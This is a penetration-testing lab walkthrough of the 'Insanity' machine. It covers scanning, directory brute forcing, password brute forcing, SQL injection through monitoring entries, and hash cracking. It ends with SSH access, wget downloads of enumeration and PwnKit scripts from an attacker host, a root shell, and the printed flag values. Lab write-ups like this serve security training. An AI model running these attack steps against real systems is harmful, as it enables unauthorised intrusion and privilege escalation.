```
---------------------Starting Full Scan------------------------

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Making a script scan on extra ports: 80

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Insanity - UK and European Servers
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
```

Run gobuster on the webserver
```
└─$ gobuster dir -u http://192.168.250.124 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt  -x php,txt -t 50 -b '403,404' -r
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.250.124
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 200) [Size: 2397]
/img                  (Status: 200) [Size: 1091]
/data                 (Status: 200) [Size: 1091]
/news                 (Status: 200) [Size: 5111]
/.                    (Status: 200) [Size: 22263]
/fonts                (Status: 200) [Size: 2915]
/webmail              (Status: 200) [Size: 2896]
/phpmyadmin           (Status: 200) [Size: 15373]
/phpinfo.php          (Status: 200) [Size: 85291]
/monitoring           (Status: 200) [Size: 4848]
/licence              (Status: 200) [Size: 57]
```

If we check /monitoring it asks for creds.
No weak credentials here unfortunately.

If we look at /news, it gives us a potential username: otis
![[Pasted image 20240226184141.png]]

If we open the /monitoring in burpsuite we can brute force using Intruder with the rockyou.txt list. (Make sure you turn on follow redirects)

![[Pasted image 20240226184541.png]]

All the responses look the same except the first one. Let's see what they look like rendered.

The first one is a failed login.
![[Pasted image 20240226184629.png]]

But the second one looks like it logged in.
![[Pasted image 20240226184658.png]]

Let's try 123456 as the password for otis.
It works!

Looking at the dashboard, we see this message
![[Pasted image 20240226184843.png]]

I remember from the gobuster scan there was /webmail - otis' credentials also work there.

Back in monitoring, let's add a machine that definitely is down and see if we get the email.
![[Pasted image 20240226185029.png]]

We got the error email.
![[Pasted image 20240226185142.png]]

Notice that test doesn't have quotes. Maybe it is SQLi. Add another machine to see if we get execution. Looking at the first email, it looks like we have 4 fields so put null for blanks.

![[Pasted image 20240226185243.png]]

When the email comes, it shows the hostname and version so we have SQLi.
![[Pasted image 20240226185341.png]]

Read the tables
![[Pasted image 20240226190025.png]]

![[Pasted image 20240226190315.png]]

This link shows us how to get more information than just fields we know
https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635

Make another monitoring item to get all the column names in the user table
![[Pasted image 20240226191404.png]]

Also do it for the other user table
![[Pasted image 20240226191521.png]]

The second one doesn't seem to be executing. Checking mysql manual, it's a default table and it gives us the fields.
https://mariadb.com/kb/en/mysql-user-table/

Dump the fields we need from that
![[Pasted image 20240226192059.png]]

Which gives us this
![[Pasted image 20240226192158.png]]

And from the users table
![[Pasted image 20240226192523.png]]

Let's try the unsalted passwords first since it'll be faster.
![[Pasted image 20240226192634.png]]

That gets us the foothold
```
└─$ ssh elliot@192.168.250.124
elliot@192.168.250.124's password: 
[elliot@insanityhosting ~]$ 
```

Transfer lse_cve.sh over and see what it finds
```
[elliot@insanityhosting ~]$ cd /tmp
[elliot@insanityhosting tmp]$ wget 192.168.45.222/lse_cve.sh
--2024-02-27 00:28:10--  http://192.168.45.222/lse_cve.sh
Connecting to 192.168.45.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 55098 (54K) [text/x-sh]
Saving to: 'lse_cve.sh'

100%[=============================================================================>] 55,098      --.-K/s   in 0.07s   

2024-02-27 00:28:10 (780 KB/s) - 'lse_cve.sh' saved [55098/55098]

[elliot@insanityhosting tmp]$ chmod +x lse_cve.sh
[elliot@insanityhosting tmp]$ ./lse_cve.sh
```

It gives us this
```
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
```

PwnKit works, get the flags
```
[elliot@insanityhosting tmp]$ wget 192.168.45.222/PwnKit.sh
--2024-02-27 00:30:47--  http://192.168.45.222/PwnKit.sh
Connecting to 192.168.45.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 150 [text/x-sh]
Saving to: 'PwnKit.sh'

100%[=============================================================================>] 150         --.-K/s   in 0.004s  

2024-02-27 00:30:47 (35.6 KB/s) - 'PwnKit.sh' saved [150/150]

[elliot@insanityhosting tmp]$ chmod +x PwnKit.sh
[elliot@insanityhosting tmp]$ ./PwnKit.sh
[root@insanityhosting tmp]# cat /root/proof.txt
ae9ba5d8aaf2fb32c3ddb1185f4dad7c
[root@insanityhosting tmp]# find / -name local.txt 2>/dev/null
/home/elliot/local.txt
[root@insanityhosting tmp]# cat /home/elliot/local.txt
7aaa69fe5ddd1068034d82ad09172a1d
```